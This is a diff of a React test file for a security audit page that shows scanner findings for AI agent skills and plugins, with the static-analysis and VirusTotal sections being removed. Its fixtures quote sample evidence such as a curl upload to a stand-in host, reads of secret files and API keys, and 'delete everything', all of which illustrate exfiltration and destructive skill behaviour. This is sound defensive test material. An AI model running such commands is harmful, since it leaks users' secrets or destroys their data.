@@ -4,17 +4,14 @@ import { beforeEach, describe, expect, it, vi } from "vitest";
 import {
   buildSecurityAuditExportEntries,
   buildSecurityAuditExportZip,
-  type StaticScan,
 } from "../lib/securityAuditExport";
 import { SecurityAuditPage } from "./SecurityAuditPage";
 import {
   getSkillSpectorIssueCount,
   SkillSpectorFindings,
-  SecurityScanResults,
   type AigAnalysis,
   type LlmAnalysis,
   type SkillSpectorAnalysis,
-  type VtAnalysis,
 } from "./SkillSecurityScanResults";
 
 const clawScanAnalysis: LlmAnalysis = {
@@ -103,46 +100,6 @@ const legacyClawScanAnalysis: LlmAnalysis = {
   ],
 };
 
-const lowConfidenceConcernAnalysis: LlmAnalysis = {
-  status: "suspicious",
-  verdict: "suspicious",
-  confidence: "high",
-  summary: "Potential concern needs review.",
-  checkedAt: Date.now(),
-  agenticRiskFindings: [
-    {
-      categoryId: "ASI02",
-      categoryLabel: "Tool Misuse and Exploitation",
-      riskBucket: "abnormal_behavior_control",
-      status: "concern",
-      severity: "critical",
-      confidence: "low",
-      evidence: {
-        path: "SKILL.md",
-        snippet: "delete everything",
-        explanation: "The text might describe destructive behavior.",
-      },
-      userImpact: "A low-confidence concern should not be displayed to users.",
-      recommendation: "Review manually.",
-    },
-    {
-      categoryId: "ASI03",
-      categoryLabel: "Identity and Privilege Abuse",
-      riskBucket: "permission_boundary",
-      status: "note",
-      severity: "low",
-      confidence: "medium",
-      evidence: {
-        path: "metadata",
-        snippet: "requires.env: SERVICE_TOKEN",
-        explanation: "The skill requires a service token for its declared integration.",
-      },
-      userImpact: "Users should know the skill needs a service token.",
-      recommendation: "Install only if token access is expected.",
-    },
-  ],
-};
-
 const skillSpectorAnalysis: SkillSpectorAnalysis = {
   status: "suspicious",
   score: 55,
@@ -189,37 +146,6 @@ const aigAnalysis: AigAnalysis = {
   ],
 };
 
-const staticScan: StaticScan = {
-  status: "suspicious",
-  reasonCodes: ["static.network_request"],
-  findings: [
-    {
-      code: "static.network_request",
-      severity: "warn",
-      file: "SKILL.md",
-      line: 12,
-      message: "Network request found in skill instructions.",
-      evidence: "curl https://collect.example/upload",
-    },
-  ],
-  summary: "Static analysis found an external network request.",
-  engineVersion: "static-publish-scan@1",
-  checkedAt: Date.now(),
-};
-
-const vtAnalysis: VtAnalysis = {
-  status: "suspicious",
-  verdict: "engines",
-  source: "engines",
-  engineStats: {
-    malicious: 1,
-    suspicious: 1,
-    harmless: 2,
-    undetected: 58,
-  },
-  checkedAt: Date.now(),
-};
-
 const originalFetch = globalThis.fetch;
 
 beforeEach(() => {
@@ -229,209 +155,7 @@ beforeEach(() => {
   window.history.replaceState(null, "", "/");
 });
 
-describe("SecurityScanResults static guidance", () => {
-  it("hides advisory static findings from the public scan panel", () => {
-    render(
-      <SecurityScanResults
-        llmAnalysis={{ status: "clean", checkedAt: Date.now() }}
-        staticFindings={[
-          {
-            code: "suspicious.env_credential_access",
-            severity: "critical",
-            file: "index.ts",
-            line: 1,
-            message: "Environment variable access combined with network send.",
-            evidence: "process.env.API_KEY",
-          },
-        ]}
-      />,
-    );
-
-    expect(screen.queryByText("Static analysis")).toBeNull();
-    expect(screen.queryByText("Confirmed safe by external scanners")).toBeNull();
-  });
-
-  it("keeps mixed advisory static findings hidden when scanners are clean", () => {
-    render(
-      <SecurityScanResults
-        llmAnalysis={{ status: "clean", checkedAt: Date.now() }}
-        staticFindings={[
-          {
-            code: "suspicious.env_credential_access",
-            severity: "critical",
-            file: "index.ts",
-            line: 1,
-            message: "Environment variable access combined with network send.",
-            evidence: "process.env.API_KEY",
-          },
-          {
-            code: "suspicious.potential_exfiltration",
-            severity: "warn",
-            file: "index.ts",
-            line: 2,
-            message: "File read combined with network send (possible exfiltration).",
-            evidence: "readFileSync(secretPath)",
-          },
-        ]}
-      />,
-    );
-
-    expect(screen.queryByText("Static analysis")).toBeNull();
-    expect(screen.queryByText("Patterns worth reviewing")).toBeNull();
-    expect(screen.queryByText("Confirmed safe by external scanners")).toBeNull();
-  });
-
-  it("renders ClawScan bucket summaries and evidence-backed notes and concerns", () => {
-    render(<SecurityScanResults llmAnalysis={clawScanAnalysis} />);
-
-    fireEvent.click(screen.getByRole("button", { name: /Collects workspace secrets/i }));
-
-    expect(screen.getByText("Findings")).toBeTruthy();
-    expect(
-      screen.getByText("ASI03: Identity and Privilege Abuse").closest("a")?.getAttribute("href"),
-    ).toBeUndefined();
-    expect(screen.getByText("ASI03: Identity and Privilege Abuse")).toBeTruthy();
-    expect(screen.getByText("ASI07: Insecure Inter-Agent Communication")).toBeTruthy();
-    expect(screen.queryByText("Permission boundary")).toBeNull();
-    expect(screen.queryByText("SKILL.md")).toBeNull();
-    expect(screen.getAllByText("Skill content").length).toBeGreaterThan(0);
-    expect(screen.getByText(/curl https:\/\/collect\.example\/upload/)).toBeTruthy();
-    expect(screen.getAllByText("What this means").length).toBeGreaterThan(0);
-    expect(
-      screen.getByText("Sensitive workspace data could leave the user's machine."),
-    ).toBeTruthy();
-    expect(screen.queryByText("ASI01")).toBeNull();
-    expect(screen.queryByText(/Confidence/i)).toBeNull();
-  });
-
-  it("shows suspicious ClawScan verdicts as review without a rolled-up risk level", () => {
-    render(<SecurityScanResults llmAnalysis={clawScanAnalysis} />);
-
-    expect(screen.getByText("Review")).toBeTruthy();
-    expect(screen.queryByText("High")).toBeNull();
-    expect(screen.queryByText(/high confidence/i)).toBeNull();
-    expect(screen.queryByText(/Suspicious/i)).toBeNull();
-  });
-
-  it("shows only pass status for clean ClawScan scans", () => {
-    render(<SecurityScanResults llmAnalysis={{ status: "clean", checkedAt: Date.now() }} />);
-
-    expect(screen.getAllByText("Pass").length).toBeGreaterThan(0);
-    expect(screen.queryByText("Low")).toBeNull();
-  });
-
-  it("promotes clean ClawScan scans with medium-or-higher visible findings to review", () => {
-    render(
-      <SecurityScanResults
-        llmAnalysis={{
-          status: "clean",
-          verdict: "benign",
-          summary: "The skill is mostly safe, but one permission deserves review.",
-          checkedAt: Date.now(),
-          agenticRiskFindings: [
-            {
-              categoryId: "ASI03",
-              categoryLabel: "Identity and Privilege Abuse",
-              riskBucket: "permission_boundary",
-              status: "note",
-              severity: "medium",
-              confidence: "medium",
-              evidence: {
-                path: "metadata",
-                snippet: "requires.env: TODOIST_API_TOKEN",
-                explanation: "The token is expected, but broad account access is still material.",
-              },
-              userImpact: "Installing the skill gives it account-level Todoist access.",
-              recommendation: "Review whether this account access is expected before install.",
-            },
-          ],
-        }}
-      />,
-    );
-
-    expect(screen.getByText("Review")).toBeTruthy();
-    expect(screen.getAllByText("Medium").length).toBeGreaterThan(0);
-    expect(screen.queryByText("Pass")).toBeNull();
-  });
-
-  it("shows medium severity only inside expanded ClawScan findings", () => {
-    const { container } = render(
-      <SecurityScanResults
-        llmAnalysis={{
-          status: "suspicious",
-          verdict: "suspicious",
-          summary: "The skill needs context before install.",
-          checkedAt: Date.now(),
-          agenticRiskFindings: [
-            {
-              categoryId: "ASI04",
-              categoryLabel: "Resource Overreach",
-              riskBucket: "permission_boundary",
-              status: "concern",
-              severity: "medium",
-              confidence: "medium",
-              evidence: {
-                path: "SKILL.md",
-                snippet: "requests write access",
-                explanation: "The skill requests write access for a broad workspace path.",
-              },
-              userImpact: "The skill can modify a broader path than expected.",
-              recommendation: "Review the requested permission boundary before install.",
-            },
-          ],
-        }}
-      />,
-    );
-
-    expect(screen.getByText("Review")).toBeTruthy();
-    expect(screen.getAllByText("Medium").length).toBe(1);
-    expect(container.querySelector(".scan-risk-level-badge")).toBeNull();
-    expect(container.querySelector(".scan-result-risk")).toBeNull();
-    fireEvent.click(screen.getByRole("button", { name: /The skill needs context/i }));
-    expect(screen.getAllByText("Medium").length).toBe(1);
-    expect(screen.queryByText("Concern")).toBeNull();
-    expect(screen.queryByText("Warn")).toBeNull();
-  });
-
-  it("ignores low-confidence findings for visible findings and status", () => {
-    render(<SecurityScanResults llmAnalysis={lowConfidenceConcernAnalysis} />);
-
-    fireEvent.click(screen.getByRole("button", { name: /Potential concern/i }));
-
-    expect(screen.getByText("Review")).toBeTruthy();
-    expect(screen.getAllByText("Low").length).toBeGreaterThan(0);
-    expect(screen.getByText("ASI03: Identity and Privilege Abuse")).toBeTruthy();
-    expect(screen.queryByText("ASI02: Tool Misuse and Exploitation")).toBeNull();
-    expect(screen.queryByText("delete everything")).toBeNull();
-  });
-
-  it("preserves legacy ClawScan dimensions when agentic fields are absent", () => {
-    render(
-      <SecurityScanResults
-        llmAnalysis={{
-          status: "clean",
-          summary: "The declared purpose matches the requested permissions.",
-          checkedAt: Date.now(),
-          dimensions: [
-            {
-              name: "purpose_capability",
-              label: "Purpose & Capability",
-              rating: "ok",
-              detail: "No mismatch found.",
-            },
-          ],
-          guidance: "Assessment stays informational.",
-        }}
-      />,
-    );
-
-    fireEvent.click(screen.getByRole("button", { name: /declared purpose/i }));
-
-    expect(screen.getByText("Purpose & Capability")).toBeTruthy();
-    expect(screen.getByText("No mismatch found.")).toBeTruthy();
-    expect(screen.queryByText("Findings")).toBeNull();
-  });
-
+describe("SecurityAuditPage", () => {
   it("uses ClawScan for audit overview without rendering a Risk analysis section", () => {
     const { container } = render(
       <SecurityAuditPage
@@ -1001,7 +725,6 @@ describe("SecurityScanResults static guidance", () => {
           checkedAt: Date.now(),
           issues: [],
         }}
-        vtAnalysis={{ status: "pending", checkedAt: Date.now() }}
       />,
     );
 
@@ -1261,52 +984,30 @@ describe("SecurityScanResults static guidance", () => {
     expect(screen.getByText("Jan 2, 2024 · 3:04 AM UTC")).toBeTruthy();
   });
 
-  it.each(["skill", "plugin"] as const)(
-    "omits VirusTotal from %s audits even when stored telemetry is present",
-    (kind) => {
-      const { container } = render(
-        <SecurityAuditPage
-          entity={{
-            kind,
-            title: "Hash Guard",
-            name: "hash-guard",
-            version: "1.2.3",
-            detailPath: "/local/hash-guard",
-          }}
-          sha256hash="abc123"
-          vtAnalysis={{
-            status: "malicious",
-            source: "engines",
-            engineStats: { malicious: 2, suspicious: 1, harmless: 3, undetected: 58 },
-            checkedAt: Date.UTC(2025, 0, 1),
-          }}
-          llmAnalysis={{
-            status: "clean",
-            summary: "No ClawScan issues.",
-            checkedAt: Date.UTC(2024, 0, 2, 3, 4),
-          }}
-        />,
-      );
-      expect(container.textContent).not.toMatch(/VirusTotal|vendors flagged/i);
-      expect(container.querySelector('a[href*="virustotal.com"]')).toBeNull();
-      expect(screen.getByRole("heading", { name: "Overview" })).toBeTruthy();
-      expect(screen.getByText("Pass")).toBeTruthy();
-      expect(screen.getByText("Jan 2, 2024 · 3:04 AM UTC")).toBeTruthy();
-    },
-  );
-
-  it.each(["panel", "badge"] as const)(
-    "renders only ClawScan in the %s scan results",
-    (variant) => {
-      const { container } = render(
-        <SecurityScanResults variant={variant} llmAnalysis={{ status: "clean", checkedAt: 1 }} />,
-      );
-      expect(container.textContent).not.toMatch(/VirusTotal/i);
-      expect(container.querySelector('a[href*="virustotal.com"]')).toBeNull();
-      expect(screen.getByText("Pass")).toBeTruthy();
-      expect(screen.getByLabelText("ClawScan")).toBeTruthy();
-    },
-  );
+  it.each(["skill", "plugin"] as const)("keeps VirusTotal out of %s audits", (kind) => {
+    const { container } = render(
+      <SecurityAuditPage
+        entity={{
+          kind,
+          title: "Hash Guard",
+          name: "hash-guard",
+          version: "1.2.3",
+          detailPath: "/local/hash-guard",
+        }}
+        sha256hash="abc123"
+        llmAnalysis={{
+          status: "clean",
+          summary: "No ClawScan issues.",
+          checkedAt: Date.UTC(2024, 0, 2, 3, 4),
+        }}
+      />,
+    );
+    expect(container.textContent).not.toMatch(/VirusTotal|vendors flagged/i);
+    expect(container.querySelector('a[href*="virustotal.com"]')).toBeNull();
+    expect(screen.getByRole("heading", { name: "Overview" })).toBeTruthy();
+    expect(screen.getByText("Pass")).toBeTruthy();
+    expect(screen.getByText("Jan 2, 2024 · 3:04 AM UTC")).toBeTruthy();
+  });
 
   it("keeps static analysis reports out of the public scanner report shell", () => {
     const { container } = render(
@@ -1357,8 +1058,6 @@ describe("SecurityScanResults static guidance", () => {
       aigAnalysis,
       llmAnalysis: clawScanAnalysis,
       skillSpectorAnalysis,
-      staticScan,
-      vtAnalysis,
       exportedAt: "2026-06-02T15:00:00.000Z",
     };
 
@@ -1367,8 +1066,6 @@ describe("SecurityScanResults static guidance", () => {
       "clawscan.json",
       "aig.json",
       "skillspector.json",
-      "static-analysis.json",
-      "virustotal.json",
     ]);
 
     const zipEntries = unzipSync(buildSecurityAuditExportZip(input));
@@ -1380,107 +1077,15 @@ describe("SecurityScanResults static guidance", () => {
       "clawscan.json",
       "manifest.json",
       "skillspector.json",
-      "static-analysis.json",
-      "virustotal.json",
     ]);
     expect(JSON.parse(decode("manifest.json")).scanners).toEqual({
       aig: "malicious",
       clawscan: "suspicious",
       skillspector: "suspicious",
-      staticAnalysis: "suspicious",
-      virustotal: "suspicious",
     });
+    expect(decode("README.md")).not.toMatch(/VirusTotal|static-analysis/);
     expect(JSON.parse(decode("aig.json")).findings[0].ruleId).toBe("T04");
     expect(JSON.parse(decode("skillspector.json")).issues[0].issueId).toBe("SDI-1");
-    expect(JSON.parse(decode("static-analysis.json")).findings[0].code).toBe(
-      "static.network_request",
-    );
-    expect(JSON.parse(decode("virustotal.json")).engineStats.malicious).toBe(1);
-  });
-
-  it("shows plugin static findings as their own security audit section", () => {
-    const { container } = render(
-      <SecurityAuditPage
-        entity={{
-          kind: "plugin",
-          title: "Plugin Guard",
-          name: "plugin-guard",
-          version: "2.0.0",
-          detailPath: "/plugins/plugin-guard",
-        }}
-        llmAnalysis={legacyClawScanAnalysis}
-        staticScan={staticScan}
-      />,
-    );
-
-    expect(screen.getByRole("heading", { name: "Plugin Guard" })).toBeTruthy();
-    expect(screen.getByText("Security checks for vulnerabilities and agentic risk")).toBeTruthy();
-    expect(screen.getByText("Legacy plugin analysis summary.")).toBeTruthy();
-    expect(screen.getByText("Legacy plugin guidance.")).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Overview" })).toBeTruthy();
-    expect(screen.queryByRole("heading", { name: "Risk analysis" })).toBeNull();
-    expect(screen.getByRole("heading", { name: "Static analysis" })).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Security Audit Metadata" })).toBeTruthy();
-    expect(screen.queryByText("[legacy.rule] expected: Legacy finding text.")).toBeNull();
-    expect(screen.queryByText("Review Dimensions")).toBeNull();
-    expect(screen.queryByText("Purpose & Capability")).toBeNull();
-    expect(screen.queryByText("Legacy dimension detail.")).toBeNull();
-    expect(screen.getByText("Static analysis found an external network request.")).toBeTruthy();
-    expect(screen.getByText("static.network_request")).toBeTruthy();
-    expect(screen.getByText("Network request found in skill instructions.")).toBeTruthy();
-    expect(
-      Array.from(container.querySelectorAll(".security-report-main > section h2")).map((node) =>
-        node.textContent?.trim(),
-      ),
-    ).toEqual(["Overview", "Static analysis"]);
-  });
-
-  it("lets static scan risk override a clean legacy ClawScan outcome", () => {
-    render(
-      <SecurityAuditPage
-        entity={{
-          kind: "plugin",
-          title: "Static Risk Plugin",
-          name: "static-risk-plugin",
-          version: "2.0.0",
-          detailPath: "/plugins/static-risk-plugin",
-        }}
-        llmAnalysis={{
-          ...legacyClawScanAnalysis,
-          status: "clean",
-          verdict: "benign",
-          summary: "Legacy scan was clean.",
-        }}
-        staticScan={{
-          ...staticScan,
-          status: "malicious",
-          findings: [{ ...staticScan.findings[0], severity: "critical" }],
-        }}
-      />,
-    );
-
-    expect(screen.getByText("Malicious")).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Static analysis" })).toBeTruthy();
-    expect(screen.getByText("Critical")).toBeTruthy();
-  });
-
-  it("does not let static scan review status downgrade a malicious ClawScan outcome", () => {
-    render(
-      <SecurityAuditPage
-        entity={{
-          kind: "plugin",
-          title: "Mixed Risk Plugin",
-          name: "mixed-risk-plugin",
-          version: "2.0.0",
-          detailPath: "/plugins/mixed-risk-plugin",
-        }}
-        llmAnalysis={{ ...legacyClawScanAnalysis, status: "malicious", verdict: "malicious" }}
-        staticScan={staticScan}
-      />,
-    );
-
-    expect(screen.getByText("Malicious")).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Static analysis" })).toBeTruthy();
   });
 
   it("does not render a scanner section for legacy-only ClawScan analysis", () => {
